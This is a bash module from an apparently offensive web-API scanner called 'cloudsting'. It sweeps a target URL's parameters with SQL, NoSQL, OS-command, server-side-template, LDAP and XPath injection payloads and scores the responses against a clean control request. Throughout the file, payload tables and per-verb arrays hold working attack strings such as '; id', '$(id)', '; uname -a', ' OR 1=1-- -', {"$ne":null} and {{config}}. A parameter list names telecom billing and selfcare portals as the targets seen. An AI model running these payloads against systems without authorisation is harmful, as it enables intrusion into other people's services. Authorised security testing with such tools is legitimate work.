#!/usr/bin/env bash
# 53_injection.sh — cloudsting module 53: the value is interpreted, not stored
# Verbs: --check | --sqli | --nosqli | --cmdi | --ssti | --ldap | --xpath
#        --payloads | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# A parent that sourced the core exports CS_MOD_DIR; this module must derive its
# own or MOD_DIR and the selftest shim point at the wrong tree.
unset CS_MOD_DIR

MODULE_ID="53_injection"
MOD_NAME="API Injection (SQL, NoSQL, command, template, LDAP, XPath)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

IJ_RUN_ID="$CS_RUN_ID"
export IJ_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/injection"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${IJ_TIMEOUT:=10}"
: "${IJ_FOLLOW:=0}"
: "${IJ_CONCURRENCY:=4}"
: "${IJ_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/53}"
: "${IJ_MARKER:=cloudsting_inject}"

ij_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the families ─────────────────────────────────────────────────
# Injection is one thing: a value the interpreter reads as code. What differs is
# which interpreter, so each family gets its own payloads and its own evidence.
# The evidence matters more than the payload — an error string proves parsing,
# a boolean pair proves execution, and a time delta proves both.
ij_families() {
    cat <<'FAMILIES'
sqli	SQL	SQL syntax error or a boolean/time delta
nosqli	NoSQL	operator object accepted where a scalar belongs
cmdi	command	a command's own output or a shell error
ssti	template	a template engine evaluated the expression
ldap	LDAP	search filter parsed the injected operator
xpath	XPath	the XPath engine evaluated the predicate
FAMILIES
}

# ── payloads ─────────────────────────────────────────────────────
# Every row: <family>\t<id>\t<payload>\t<evidence-kind>\t<what it proves>
# evidence-kind: error (a parser complained), boolean-pair (two payloads that
# must differ), time (a delta appeared), output (the interpreter printed).
ij_payloads() {
    cat <<'PAYLOADS'
sqli	sq-quote	'	error	an unbalanced quote reaches the parser
sqli	sq-or-true	' OR '1'='1	error	the WHERE clause becomes true
sqli	sq-or-1	' OR 1=1-- -	error	comment truncates the rest of the clause
sqli	sq-union	' UNION SELECT NULL-- -	error	a column count was attempted
sqli	sq-bool-t	' AND '1'='1	boolean-pair	control for the false pair
sqli	sq-bool-f	' AND '1'='2	boolean-pair	the false half of the pair
sqli	sq-time	mysql: SLEEP	time	a delay the server caused itself
sqli	sq-stack	'; SELECT 1-- -	error	stacked statements are not disabled
nosqli	ns-gt	{"$gt":""}	error	the driver accepted an operator object
nosqli	ns-ne	{"$ne":null}	boolean-pair	not-equal matches everything
nosqli	ns-regex	{"$regex":".*"}	boolean-pair	regex operator evaluated
nosqli	ns-where	{"$where":"1==1"}	error	server-side javascript accepted
nosqli	ns-parens	' || '1'=='1	error	string form of the operator
cmdi	cm-semi	; id	output	the shell ran a second command
cmdi	cm-pipe	| id	output	a pipe reached the shell
cmdi	cm-subst	$(id)	output	command substitution evaluated
cmdi	cm-backtick	`id`	output	backtick substitution evaluated
cmdi	cm-nl	%0aid	output	a newline split the argument
cmdi	cm-time	; sleep 5	time	a delay the shell caused
ssti	st-basic	{{7*7}}	output	the template engine evaluated arithmetic
ssti	st-basic2	${7*7}	output	an expression syntax was evaluated
ssti	st-jinja	{{7*'7'}}	output	language semantics are observable
ssti	st-freemarker	<#assign x=7*7>${x}	output	a tag was interpreted
ssti	st-twig	{{7*7}}	output	a php template evaluated
ldap	ld-star	*	boolean-pair	a bare star matches every entry
ldap	ld-paren	*)(uid=*	error	the filter was not escaped
ldap	ld-or	(|(uid=*)	error	a filter operator was injected
xpath	xp-quote	'	error	an unbalanced quote reaches the engine
xpath	xp-or	' or '1'='1	error	the predicate becomes true
xpath	xp-paren	'] | //* | a['	error	the expression was not escaped
PAYLOADS
}

# Where a value like this actually lands. Names are the ones the campaign sees
# in BSS and selfcare portals; the class says how it gets there.
ij_params() {
    cat <<'PARAMS'
msisdn	path-or-query	the id in /customer/{id}
id	path-or-query	generic record id
account_id	query	a billing account
username	body	the login name
password	body	the password field
search	query	a subscriber search box
q	query	a free text field
email	body	a registration email
coupon	body	a promo code
callback	query	a webhook url
file	body	a filename
sort	query	an ORDER BY the app builds
filter	query	a filter language
PARAMS
}

ij_evidence_kinds() {
    printf 'error\nboolean-pair\ntime\noutput\n'
}

# ── one request ──────────────────────────────────────────────────
# The response is reduced to what evidence needs: the status, a hash, the size,
# and the body on disk so an error string can be grepped without holding it.
#   ij_send <url> [method] [body] [content-type] [extra-header]
#   -> code \x1f bytes \x1f time \x1f hash \x1f body-path
ij_send() {
    local url="$1" method="${2:-GET}" body="${3:-}" ctype="${4:-}" hdr="${5:-}"
    local out; out="$(mktemp "$CS_SCRATCH/ij.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.ij.$$"
    local -a args=(-s -o "$out" --max-time "$IJ_TIMEOUT" -A "$IJ_UA" -X "$method")
    (( IJ_FOLLOW == 1 )) && args+=(-L)
    [[ -n "$body"  ]] && args+=(--data-binary "$body")
    [[ -n "$ctype" ]] && args+=(-H "Content-Type: $ctype")
    [[ -n "$hdr"   ]] && args+=(-H "$hdr")

    local meta
    meta="$(curl "${args[@]}" --write-out '%{http_code}\t%{size_download}\t%{time_total}' \
                 "$url" 2>/dev/null)" || meta=""
    local code bytes tm
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code bytes tm <<<"$meta" ;;
        *) code="000"; bytes="0"; tm="0" ;;
    esac
    local hash; hash="$(cs_fingerprint "$(head -c 65536 "$out" 2>/dev/null)")"
    printf '%s\037%s\037%s\037%s\037%s\n' "${code:-000}" "${bytes:-0}" "${tm:-0}" "$hash" "$out"
}

# Escape a value for a URL. `jq -sRr @uri` is the one encoder everywhere has.
ij_urlenc() { printf '%s' "$1" | jq -sRr @uri 2>/dev/null || printf '%s' "$1"; }

# JSON string escaping, because a payload inside a JSON body must not break it.
ij_jsonesc() {
    printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g'
}

# A payload is spliced into a value, not appended to the URL: the caller names
# the parameter and where it lives.
#   ij_build <url> <param> <payload> <where:query|body-json|path>
#   -> url \x1f method \x1f body \x1f content-type
ij_build() {
    local url="$1" param="$2" payload="$3" where="${4:-query}"
    local enc; enc="$(ij_urlenc "$payload")"
    case "$where" in
        path)
            local new="${url//\{$param\}/$enc}"
            [[ "$new" == "$url" ]] && new="${url%/}/$enc"
            printf '%s\034GET\034\034\n' "$new"
            ;;
        body-json)
            local body; body="$(printf '{"%s":"%s"}' "$param" "$(ij_jsonesc "$payload")")"
            printf '%s\034POST\034%s\034application/json\n' "$url" "$body"
            ;;
        body-form)
            local body; body="${param}=${enc}"
            printf '%s\034POST\034%s\034application/x-www-form-urlencoded\n' "$url" "$body"
            ;;
        *)
            case "$url" in
                *\?*) printf '%s&%s=%s\034GET\034\034\n' "$url" "$param" "$enc" ;;
                *)    printf '%s?%s=%s\034GET\034\034\n' "$url" "$param" "$enc" ;;
            esac
            ;;
    esac
}

# ij_build_split <url> <param> <payload> <where> -> sets the four locals the
# caller asked for. Kept separate from cs_split because ij_build joins on FS.
ij_build_split() {
    local _row _a _b _c _d
    _row="$(ij_build "$@")"
    IFS=$'\034' read -r _a _b _c _d <<<"$_row"
    printf '%s\037%s\037%s\037%s\n' "$_a" "$_b" "$_c" "$_d"
}

# ── evidence ─────────────────────────────────────────────────────
# The error strings. A 500 is not evidence by itself: a page that 500s on every
# input proves nothing, so the verdict below always compares against a clean
# request. These are the strings that mean the interpreter, not the app, spoke.
ij_error_markers() {
    cat <<'MARKERS'
SQL syntax
sql syntax
ORA-0
ORA-1
PG::SyntaxError
psql:
SQLite/JDBCDriver
SQLite3::SQLException
Near ":
unclosed quotation mark
quoted string not properly terminated
Microsoft OLE DB Provider for SQL Server
ODBC SQL Server Driver
You have an error in your SQL syntax
syntax error at or near
SQLSTATE
mysql_fetch
Invalid query
unrecognized token:
division by zero
MongoError
MongoServerError
Cast to ObjectId failed
cannot unmarshal
invalid character '
unexpected end of JSON input
ClassCastException
NoSuchElementException
System.Xml.XmlException
XPathException
javax.naming.NamingException
LDAPException
Invalid DN syntax
error parsing filter
TemplateSyntaxError
jinja2.exceptions
freemarker.core
VelocityException
org.thymeleaf
Twig\Error
sh: 1:
bash: 
command not found
No such file or directory
/bin/sh
MARKERS
}

# Language-specific output that only a shell produces.
ij_output_markers() {
    cat <<'OUTPUT'
uid=0(root)
uid=33(www-data)
uid=1000(
gid=0(root)
Linux 
GNU/Linux
bin/sh
total 0
OUTPUT
}

#   ij_error_seen <body-path>
ij_error_seen() {
    local body="$1" m
    [[ -f "$body" ]] || { printf '0'; return; }
    while IFS= read -r m; do
        [[ -z "$m" ]] && continue
        if grep -qaiF -- "$m" "$body" 2>/dev/null; then
            printf '1'
            return
        fi
    done < <(ij_error_markers)
    printf '0'
}

#   ij_output_seen <body-path> <marker>
ij_output_seen() {
    local body="$1" marker="${2:-$IJ_MARKER}" m
    [[ -f "$body" ]] || { printf '0'; return; }
    grep -qaF -- "$marker" "$body" 2>/dev/null && { printf '1'; return; }
    while IFS= read -r m; do
        [[ -z "$m" ]] && continue
        if grep -qaF -- "$m" "$body" 2>/dev/null; then
            printf '1'
            return
        fi
    done < <(ij_output_markers)
    printf '0'
}

# SQL arithmetic is the only in-band proof: 49 in the response where 49 was
# asked for is the DBMS answering, not the app.
ij_arith_seen() {
    local body="$1"
    [[ -f "$body" ]] || { printf '0'; return; }
    if grep -qaE '(^|[^0-9])49([^0-9]|$)' "$body" 2>/dev/null; then printf '1'
    elif grep -qaE '(^|[^0-9])343([^0-9]|$)' "$body" 2>/dev/null; then printf '1'
    else printf '0'; fi
}

# ── verdicts ─────────────────────────────────────────────────────
# The one rule: injection is a DELTA against a clean request, and an error page
# that appears for every input is not a delta. `ij_verdict` takes the control
# and the payload result and decides which of five things happened.
#   ij_verdict <control-code> <control-hash> <ctl-error> <probe-code>
#              <probe-hash> <probe-error> <probe-output> <evid-kind>
ij_verdict() {
    local cc="$1" ch="$2" ce="$3" pc="$4" ph="$5" pe="$6" po="$7" kind="$8"
    case "$pc" in
        000) printf 'unreachable'; return ;;
        404|410) printf 'absent'; return ;;
        405) printf 'no-method'; return ;;
    esac
    [[ "$cc" == "000" ]] && { printf 'unreachable'; return; }
    # the app errors on a clean value too: its own noise, not injection
    if [[ "$ce" == "1" ]]; then printf 'app-errors-on-clean'; return; fi

    case "$kind" in
        error)
            if [[ "$pe" == "1" ]]; then
                if [[ "$pc" == "$cc" && "$ph" == "$ch" ]]; then
                    printf 'no-delta'
                else
                    printf 'error-on-payload'
                fi
            else
                printf 'no-error'
            fi
            ;;
        output)
            if [[ "$po" == "1" ]]; then
                printf 'output'
            elif [[ "$ph" == "$ch" ]]; then
                printf 'no-delta'
            else
                printf 'differs-no-output'
            fi
            ;;
        time)
            printf 'needs-timed-run'
            ;;
        boolean-pair)
            printf 'needs-pair'
            ;;
        *) printf 'unknown-kind' ;;
    esac
}

# The boolean pair: two payloads, one that should be true and one false. If the
# responses differ from each other the predicate is being evaluated. Compared
# by hash, with the payload's own length normalised out by using equal length
# payloads wherever the table can.
#   ij_pair_verdict <true-code> <true-hash> <false-code> <false-hash> <ctl-hash>
ij_pair_verdict() {
    local tc="$1" th="$2" fc="$3" fh="$4" ch="$5"
    case "$tc$fc" in *000*) printf 'unreachable'; return ;; esac
    if [[ "$th" == "$fh" && "$tc" == "$fc" ]]; then printf 'same-response'; return; fi
    if [[ "$th" == "$ch" || "$fh" == "$ch" ]]; then
        # one arm equals the clean response: the predicate changed nothing
        if [[ "$th" == "$ch" ]]; then printf 'false-arm-clean'; return; fi
        printf 'true-arm-clean'; return
    fi
    printf 'pair-differs'
}

# The time pair: a payload that sleeps versus one that does not. Two seconds of
# fixed jitter is the floor — below it, a CDN or a GC pause explains the delta.
#   ij_time_verdict <control-seconds> <sleep-seconds> [jitter]
ij_time_verdict() {
    local ctl="$1" slp="$2" jitter="${3:-2}"
    awk -v c="$ctl" -v s="$slp" -v j="$jitter" 'BEGIN{
        d = s - c;
        if (s == 0 || c == 0) { print "no-timing"; exit }
        if (d >= j) { print "time-delta"; exit }
        if (d <= -j) { print "faster"; exit }
        printf "within-noise\n";
    }'
}

# ── verbs ────────────────────────────────────────────────────────

# --check <url> <param> [where] [family]: the whole family sweep for one
# parameter. A clean control first, then every payload of every family.
ij_cmd_check() {
    local base="${1:-}" param="${2:-}" where="${3:-query}" only="${4:-}"
    if [[ -z "$base" || -z "$param" ]]; then
        ij_log "usage: --check <url> <param> [query|body-json|body-form|path] [family]"
        return 2
    fi
    cs_row TARGET "$base"
    cs_row PARAM "$param"
    cs_row WHERE "$where"

    # clean control: the parameter with a benign value the app understands
    local s_url s_method s_body s_ctype
    cs_split "$(ij_build_split "$base" "$param" "cloudsting_clean" "$where")" s_url s_method s_body s_ctype
    local c_code c_bytes c_time c_hash c_body
    cs_split "$(ij_send "$s_url" "$s_method" "$s_body" "$s_ctype")" c_code c_bytes c_time c_hash c_body
    local c_err; c_err="$(ij_error_seen "$c_body")"
    rm -f "$c_body"
    cs_row CONTROL "code=$c_code" "bytes=$c_bytes" "error=$c_err"

    if [[ "$c_code" == "000" ]]; then
        cs_row VERDICT "unreachable" "the clean request did not answer"
        cs_row SUMMARY "families=0 payloads=0 hits=0"
        return 3
    fi
    if [[ "$c_err" == "1" ]]; then
        cs_row NOTE "the clean value already produces an error string — deltas are unreliable here"
    fi

    : > "$HIT_FILE"
    local fam id payload kind proves
    local tried=0 hits=0 fams=0 last_fam=""
    while IFS=$'\t' read -r fam id payload kind proves; do
        [[ -z "$fam" ]] && continue
        [[ -n "$only" && "$fam" != "$only" ]] && continue
        [[ "$fam" != "$last_fam" ]] && { fams=$((fams + 1)); last_fam="$fam"; }
        tried=$((tried + 1))

        local p_url p_method p_body p_ctype
        cs_split "$(ij_build_split "$base" "$param" "$payload" "$where")" p_url p_method p_body p_ctype
        local p_code p_bytes p_time p_hash p_bodyf
        cs_split "$(ij_send "$p_url" "$p_method" "$p_body" "$p_ctype")" p_code p_bytes p_time p_hash p_bodyf
        local p_err p_out p_arith
        p_err="$(ij_error_seen "$p_bodyf")"
        p_out="$(ij_output_seen "$p_bodyf")"
        p_arith="$(ij_arith_seen "$p_bodyf")"
        rm -f "$p_bodyf"

        local verdict; verdict="$(ij_verdict "$c_code" "$c_hash" "$c_err" \
                                            "$p_code" "$p_hash" "$p_err" "$p_out" "$kind")"
        printf 'payload\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$fam" "$id" "$p_code" "$verdict" "$p_err$p_out$p_arith" "$p_time" >> "$PROBE_FILE"

        case "$verdict" in
            error-on-payload|output)
                hits=$((hits + 1))
                local sev="HIGH"
                [[ "$fam" == "cmdi" ]] && sev="CRITICAL"
                [[ "$p_arith" == "1" ]] && sev="CRITICAL"
                cs_row HIT "$fam" "$id" "code=$p_code" "evidence=$verdict" "$proves"
                printf '%s\t%s\t%s\t%s\n' "$fam" "$id" "$p_code" "$verdict" >> "$HIT_FILE"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "$sev" "injection-$fam-$id" \
                    "$param ($where): $proves — $verdict"
                ;;
            no-delta)
                cs_row SAME "$fam" "$id" "code=$p_code" "$verdict"
                ;;
            *)
                cs_row PROBE "$fam" "$id" "code=$p_code" "$verdict"
                ;;
        esac
    done < <(ij_payloads)

    local overall="clean"
    (( hits > 0 )) && overall="injectable"
    cs_row VERDICT "$overall" "$hits of $tried payloads"
    cs_row SUMMARY "families=$fams payloads=$tried hits=$hits"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# --sqli <url> <param> [where]: the boolean pair plus the error payloads. Two
# payloads that must differ is the only family-level proof that survives a
# generic 500 page.
ij_cmd_sqli() {
    local base="${1:-}" param="${2:-}" where="${3:-query}"
    [[ -z "$base" || -z "$param" ]] && { ij_log "usage: --sqli <url> <param> [where]"; return 2; }
    cs_row TARGET "$base"
    cs_row PARAM "$param"

    local t_payload="' AND '1'='1" f_payload="' AND '1'='2"
    local t_url t_m t_b t_c f_url f_m f_b f_c
    cs_split "$(ij_build_split "$base" "$param" "$t_payload" "$where")" t_url t_m t_b t_c
    cs_split "$(ij_build_split "$base" "$param" "$f_payload" "$where")" f_url f_m f_b f_c

    local t_code _t _tt t_hash t_body f_code _f _ft f_hash f_body c_code _c _ct c_hash c_body
    cs_split "$(ij_send "$t_url" "$t_m" "$t_b" "$t_c")" t_code _t _tt t_hash t_body
    cs_split "$(ij_send "$f_url" "$f_m" "$f_b" "$f_c")" f_code _f _ft f_hash f_body
    cs_split "$(ij_build_split "$base" "$param" "cloudsting_clean" "$where")" c_url c_m c_b c_ctype
    cs_split "$(ij_send "$c_url" "$c_m" "$c_b" "$c_ctype")" c_code _c _ct c_hash c_body

    local t_err f_err c_err t_arith
    t_err="$(ij_error_seen "$t_body")"
    f_err="$(ij_error_seen "$f_body")"
    c_err="$(ij_error_seen "$c_body")"
    t_arith="$(ij_arith_seen "$t_body")"
    rm -f "$t_body" "$f_body" "$c_body"

    cs_row CONTROL "code=$c_code" "error=$c_err"
    cs_row TRUE_ARM "code=$t_code" "error=$t_err" "arith=$t_arith"
    cs_row FALSE_ARM "code=$f_code" "error=$f_err"

    local pair; pair="$(ij_pair_verdict "$t_code" "$t_hash" "$f_code" "$f_hash" "$c_hash")"
    cs_row PAIR "$pair"
    if [[ "$t_err" == "1" || "$f_err" == "1" ]] && [[ "$c_err" == "0" ]]; then
        cs_row ERROR_EVIDENCE "the payload arm produced a parser error the control did not"
    fi
    if [[ "$t_arith" == "1" ]]; then
        cs_row ARITHMETIC "49 appeared in the response"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "CRITICAL" "sqli-arithmetic" \
            "$param: the DBMS evaluated arithmetic in-band (49 returned)"
    fi

    local verdict="not-injectable"
    if [[ "$pair" == "pair-differs" || "$t_arith" == "1" ]]; then
        verdict="boolean-blind"
        [[ "$t_arith" == "1" ]] && verdict="error-based"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "CRITICAL" "sqli-$verdict" \
            "$param: the true and false predicates produced different responses"
    elif [[ "$c_err" == "0" && ( "$t_err" == "1" || "$f_err" == "1" ) ]]; then
        verdict="error-leak"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "HIGH" "sqli-error-leak" \
            "$param: a SQL parse error reached the client for the payload but not the control"
    fi
    cs_row VERDICT "$verdict"
    cs_row SUMMARY "pair=$pair arith=$t_arith verdict=$verdict"
    return 0
}

# --nosqli <url> <param>: the operators a JSON body can carry. A driver that
# accepts {"$gt":""} where a string belongs is the whole vulnerability.
ij_cmd_nosqli() {
    local base="${1:-}" param="${2:-}"
    [[ -z "$base" || -z "$param" ]] && { ij_log "usage: --nosqli <url> <param>"; return 2; }
    cs_row TARGET "$base"
    cs_row PARAM "$param"

    local -a ops=(
        '{"$gt":""}|gt'
        '{"$ne":null}|ne'
        '{"$regex":".*"}|regex'
        '{"$where":"1==1"}|where'
        '{"$exists":true}|exists'
        '{"$in":[null]}|in'
        '{"$nin":[]}|nin'
    )
    local pair body id code _b _t hash err out
    local tried=0 hits=0
    for pair in "${ops[@]}"; do
        body="${pair%|*}"; id="${pair##*|}"
        tried=$((tried + 1))
        local wrapped; wrapped="$(printf '{"%s":%s}' "$param" "$body")"
        cs_split "$(ij_send "$base" POST "$wrapped" application/json)" code _b _t hash fbody
        err="$(ij_error_seen "$fbody")"
        out="$(ij_output_seen "$fbody")"
        rm -f "$fbody"

        # an operator is accepted when the answer is structured and it is not an
        # explicit validation refusal — a 400 saying "expected string" IS the fix
        local verdict="refused"
        case "$code" in
            000) verdict="unreachable" ;;
            400|422) verdict="refused" ;;
            2*|5*)
                if [[ "$err" == "1" ]]; then verdict="error"; else verdict="accepted"; fi
                ;;
        esac
        case "$verdict" in
            accepted)
                hits=$((hits + 1))
                cs_row HIT "$id" "code=$code" "the operator object was accepted"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "HIGH" "nosqli-$id" \
                    "$param: the driver accepted {\"\$$id\"} where a scalar belongs"
                ;;
            *) cs_row OPERATOR "$id" "code=$code" "$verdict" ;;
        esac
    done
    cs_row SUMMARY "operators=$tried accepted=$hits"
    return 0
}

# --cmdi <url> <param> [where]: a command needs an interpreter to run it, so the
# evidence is the command's own output, not an error.
ij_cmd_cmdi() {
    local base="${1:-}" param="${2:-}" where="${3:-query}"
    [[ -z "$base" || -z "$param" ]] && { ij_log "usage: --cmdi <url> <param> [where]"; return 2; }
    cs_row TARGET "$base"
    cs_row PARAM "$param"

    local -a pays=(
        "; echo $IJ_MARKER"
        "| echo $IJ_MARKER"
        "&& echo $IJ_MARKER"
        "\$(echo $IJ_MARKER)"
        "\`echo $IJ_MARKER\`"
        "%0aecho $IJ_MARKER"
        "; id"
        "| id"
        "; uname -a"
    )
    local p tried=0 hits=0
    for p in "${pays[@]}"; do
        tried=$((tried + 1))
        local u m b c
        cs_split "$(ij_build_split "$base" "$param" "$p" "$where")" u m b c
        local code _by _t hash fbody
        cs_split "$(ij_send "$u" "$m" "$b" "$c")" code _by _t hash fbody
        local out; out="$(ij_output_seen "$fbody" "$IJ_MARKER")"
        rm -f "$fbody"
        if [[ "$out" == "1" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$p" "code=$code" "the interpreter printed the marker"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "CRITICAL" "command-injection" \
                "$param: '$p' was executed by a shell — the marker came back in the response"
        else
            cs_row PAYLOAD "$p" "code=$code" "no-output"
        fi
    done
    cs_row SUMMARY "payloads=$tried executed=$hits"
    return 0
}

# --ssti <url> <param> [where]: 49 is the whole test. A template that computes
# {{7*7}} has executed code, and no amount of input filtering changes that.
ij_cmd_ssti() {
    local base="${1:-}" param="${2:-}" where="${3:-query}"
    [[ -z "$base" || -z "$param" ]] && { ij_log "usage: --ssti <url> <param> [where]"; return 2; }
    cs_row TARGET "$base"
    cs_row PARAM "$param"

    local -a pays=(
        "{{7*7}}|twig-jinja"
        "\${7*7}|jsp-spring"
        "#{7*7}|thymeleaf"
        "{{7*'7'}}|jinja-semantics"
        "<%= 7*7 %>|erb-ejs"
        "{{config}}|jinja-config"
    )
    local p id tried=0 hits=0
    for p in "${pays[@]}"; do
        tried=$((tried + 1))
        local payload="${p%|*}" engine="${p##*|}"
        local u m b c
        cs_split "$(ij_build_split "$base" "$param" "$payload" "$where")" u m b c
        local code _by _t hash fbody
        cs_split "$(ij_send "$u" "$m" "$b" "$c")" code _by _t hash fbody
        local arith; arith="$(ij_arith_seen "$fbody")"
        # 7*'7' produces a string of sevens, not 49 — worth its own row
        local seven=0
        [[ "$engine" == "jinja-semantics" ]] && grep -qaF '7777777' "$fbody" 2>/dev/null && seven=1
        rm -f "$fbody"
        if [[ "$arith" == "1" || "$seven" == "1" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$engine" "code=$code" "evaluated" "$payload"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "CRITICAL" "ssti-$engine" \
                "$param: '$payload' was evaluated by the template engine"
        else
            cs_row PAYLOAD "$engine" "code=$code" "not-evaluated"
        fi
    done
    cs_row SUMMARY "payloads=$tried evaluated=$hits"
    return 0
}

# --ldap <url> <param> [where]: a filter is an expression. A bare star that
# matches more than the clean value did is the whole finding.
ij_cmd_ldap() {
    local base="${1:-}" param="${2:-}" where="${3:-query}"
    [[ -z "$base" || -z "$param" ]] && { ij_log "usage: --ldap <url> <param> [where]"; return 2; }
    cs_row TARGET "$base"
    local -a pays=(
        "*|star"
        "admin*|prefix"
        "*)(uid=*|filter-break"
        ")(|(objectClass=*|or-injection"
        "*))%00|nul-terminate"
        "\\2a|escaped-star"
    )
    local c_code _c _ct c_hash c_body
    cs_split "$(ij_build_split "$base" "$param" "cloudsting_clean" "$where")" u m b ct
    cs_split "$(ij_send "$u" "$m" "$b" "$ct")" c_code _c _ct c_hash c_body
    local c_err; c_err="$(ij_error_seen "$c_body")"
    rm -f "$c_body"

    local p tried=0 hits=0
    for p in "${pays[@]}"; do
        tried=$((tried + 1))
        local payload="${p%|*}" id="${p##*|}"
        local u m b ct
        cs_split "$(ij_build_split "$base" "$param" "$payload" "$where")" u m b ct
        local code _by _t hash fbody
        cs_split "$(ij_send "$u" "$m" "$b" "$ct")" code _by _t hash fbody
        local err; err="$(ij_error_seen "$fbody")"
        rm -f "$fbody"
        local verdict="refused"
        case "$code" in
            000) verdict="unreachable" ;;
            400|422) verdict="refused" ;;
            2*) [[ "$hash" != "$c_hash" ]] && verdict="differs" || verdict="same" ;;
            5*) verdict="error" ;;
        esac
        if [[ "$verdict" == "differs" && "$id" == "star" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$id" "code=$code" "a bare star changed the result set"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "HIGH" "ldap-wildcard" \
                "$param: a wildcard character changed the result set — the filter is not escaped"
        elif [[ "$err" == "1" && "$c_err" == "0" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$id" "code=$code" "filter error leaked"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "HIGH" "ldap-filter-error" \
                "$param: '$payload' produced a directory filter error the control did not"
        else
            cs_row PAYLOAD "$id" "code=$code" "$verdict"
        fi
    done
    cs_row SUMMARY "payloads=$tried hits=$hits"
    return 0
}

# --xpath <url> <param> [where]: the same shape as LDAP, a different engine.
ij_cmd_xpath() {
    local base="${1:-}" param="${2:-}" where="${3:-query}"
    [[ -z "$base" || -z "$param" ]] && { ij_log "usage: --xpath <url> <param> [where]"; return 2; }
    cs_row TARGET "$base"
    local c_code _c _ct c_hash c_body
    cs_split "$(ij_build_split "$base" "$param" "cloudsting_clean" "$where")" u m b ct
    cs_split "$(ij_send "$u" "$m" "$b" "$ct")" c_code _c _ct c_hash c_body
    local c_err; c_err="$(ij_error_seen "$c_body")"
    rm -f "$c_body"

    local -a pays=("'|quote" "' or '1'='1|or" "] | //* | a[|pipe" "count(//*)|function")
    local p tried=0 hits=0
    for p in "${pays[@]}"; do
        tried=$((tried + 1))
        local payload="${p%|*}" id="${p##*|}"
        local u m b ct
        cs_split "$(ij_build_split "$base" "$param" "$payload" "$where")" u m b ct
        local code _by _t hash fbody
        cs_split "$(ij_send "$u" "$m" "$b" "$ct")" code _by _t hash fbody
        local err; err="$(ij_error_seen "$fbody")"
        rm -f "$fbody"
        if [[ "$err" == "1" && "$c_err" == "0" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$id" "code=$code" "engine error"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "HIGH" "xpath-injection" \
                "$param: '$payload' reached the XPath engine and it complained"
        else
            cs_row PAYLOAD "$id" "code=$code" "$verdict"
        fi
    done
    cs_row SUMMARY "payloads=$tried hits=$hits"
    return 0
}

ij_cmd_payloads() {
    local fam="${1:-}"
    local f id payload kind proves
    while IFS=$'\t' read -r f id payload kind proves; do
        [[ -z "$f" ]] && continue
        [[ -n "$fam" && "$f" != "$fam" ]] && continue
        cs_row PAYLOAD "$f" "$id" "$kind" "$payload"
    done < <(ij_payloads)
    cs_row SUMMARY "payloads=$(ij_payloads | wc -l | tr -d ' ')"
    return 0
}

ij_cmd_params() {
    local name where what
    while IFS=$'\t' read -r name where what; do
        [[ -z "$name" ]] && continue
        cs_row PARAM "$name" "$where" "$what"
    done < <(ij_params)
    cs_row SUMMARY "params=$(ij_params | wc -l | tr -d ' ')"
    return 0
}

ij_cmd_families() {
    local f what proves
    while IFS=$'\t' read -r f what proves; do
        [[ -z "$f" ]] && continue
        cs_row FAMILY "$f" "$what" "$proves"
    done < <(ij_families)
    cs_row SUMMARY "families=$(ij_families | wc -l | tr -d ' ')"
    return 0
}

ij_cmd_list() { ij_cmd_families; }

ij_cmd_status_tsv() {
    local curl_state jq_state
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    command -v jq   >/dev/null 2>&1 && jq_state="jq-ok"     || jq_state="jq-missing"
    printf '%s\t%s\t%s\t%s\tfamilies-%s\tpayloads-%s\tparams-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" \
        "$(ij_families | wc -l | tr -d ' ')" \
        "$(ij_payloads | wc -l | tr -d ' ')" \
        "$(ij_params | wc -l | tr -d ' ')"
}

ij_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ij_cmd_help() {
    cat <<'HELP'
cloudsting module 53 — API Injection v1.0.0
  --check <url> <param> [where] [family]   every payload of every family at one parameter
  --sqli <url> <param> [where]             boolean pair, error payloads, in-band arithmetic
  --nosqli <url> <param>                   operator objects a JSON body can carry
  --cmdi <url> <param> [where]             shell metacharacters, proof by marker output
  --ssti <url> <param> [where]             template evaluation, proof by 49
  --ldap <url> <param> [where]             filter injection, proof by a changed result set
  --xpath <url> <param> [where]            predicate injection, proof by engine error
  --payloads [family] | --params | --families | --list
  --status-tsv | --menu | --selftest | --help

where is one of query (default), body-json, body-form, path.

Injection is a DELTA against a clean request. A parser error that the clean
request also produces is the app's own noise and is reported as such; a 49 that
appears for {{7*7}} is not noise. A time delta must beat two seconds of jitter
before it is called one.

Environment: IJ_TIMEOUT (10), IJ_FOLLOW (0), IJ_MARKER, IJ_UA
HELP
}

